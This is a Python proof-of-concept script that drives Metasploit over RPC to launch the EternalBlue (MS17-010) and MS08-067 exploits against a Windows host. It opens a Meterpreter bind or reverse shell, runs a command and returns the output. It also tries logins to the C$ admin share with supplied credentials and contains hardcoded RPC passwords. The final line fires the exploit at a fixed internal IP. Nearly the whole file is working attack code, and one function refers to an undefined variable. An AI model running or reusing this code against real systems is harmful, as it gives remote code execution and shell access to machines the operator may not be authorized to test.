import subprocess
import smbclient
from pymetasploit3.msfrpc import MsfRpcClient
class poc_module:
    def __init__(self,ipaddress):
        self.ip = ipaddress
    def smb_account_poc(self,username,password,domain):
        try:
            smb = smbclient.SambaClient(server=ipaddress, share="C$", username=username, password=password, domain=domain)
            exploit_folder = smb.listdir('/')
            return exploit_folder
        except:
            exploit_folder = "NULL"
            return exploit_folder
    def ms17010_poc(self):
        client = MsfRpcClient('XzQLJcrt', port=55552,ssl=False)
        exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
        exploit['RHOSTS']  = str(self.ip)
        print(self.ip)
        exploit.execute(payload='windows/x64/meterpreter/bind_tcp')
        # exploit.execute(payload="windows/x64/shell/reverse_tcp")
        
        # print(result)
        if bool(client.sessions.list):
            session_number = list(client.sessions.list.keys())[0]
            print(session_number)
            shell = client.sessions.session(session_number)
            shell.write('dir')
            result = shell.read()
            final_result = "\n".join(result.splitlines()[4:10])
            return final_result
        else:
            print("null")
            return "NULL"
    def ms08067_poc(self):
        client = MsfRpcClient('1qaz@WSX',ssl=False)
        exploit = client.modules.use('exploit','windows/smb/ms08_067_netapi')
        exploit['RHOSTS']  = str(self.ip)
        result = exploit.execute(payload='windows/meterpreter/reverse_tcp')
        print(result)
        if bool(client.sessions.list):
            session_number = list(client.sessions.list.keys())[0]
            shell = client.sessions.session(session_number)
            shell.write('dir')
            result = shell.read()
            final_result = "\n".join(result.splitlines()[4:10])
           
            return final_result
            # print(result.split(" "))
            return result
        else:
            print("null")
            return "NULL"

# data = {"prove":""}
print(poc_module("192.168.1.106").ms08067_poc())
# print(data['prove'])